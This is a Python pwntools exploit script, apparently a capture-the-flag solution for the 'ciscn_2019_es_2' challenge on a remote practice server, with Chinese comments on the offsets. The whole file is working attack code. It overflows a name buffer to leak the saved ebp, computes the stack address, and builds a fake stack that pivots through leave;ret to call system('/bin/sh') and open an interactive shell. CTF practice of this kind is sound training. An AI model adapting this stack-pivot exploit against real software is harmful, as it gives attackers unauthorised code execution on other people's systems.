from pwn import *

context.log_level = 'debug'

# r = process('./ciscn_2019_es_2')
r = remote('node5.buuoj.cn', 28746)
elf = ELF('../pwn_file/ciscn_2019_es_2')

#gdb.attach(r)

payload = b'a' * 0x26 + b'b' * 2

r.recvuntil(b'your name?\n')
r.send(payload)
r.recvuntil(b'aabb')

# leak ebp
old_ebp_addr = u32(r.recv(4))
print(hex(old_ebp_addr))  # 0xffc00c18

# 因为溢出要覆盖ebp的地址，而leak的地址正是ebp+0x10的地址
ebp_addr = old_ebp_addr - 0x10

# ebp距离s（输入点）有0x28
s_addr = ebp_addr - 0x28
# s_addr = old_ebp_addr - 0x38
print(hex(s_addr))  # 0xffc00be0

system_addr = elf.sym['system']
leave_ret = 0x8048562

# fake stack
#        用来pop ebp     system          ret    存未来写入的sh字符串的地址    sh字符串
payload2 = b'aaaa' + p32(system_addr) + p32(0) + p32(s_addr + 0x10) + b'/bin/sh\x00'
payload2 = payload2.ljust(0x28, b'\x00') + p32(s_addr) + p32(leave_ret)
r.send(payload2)
r.interactive()
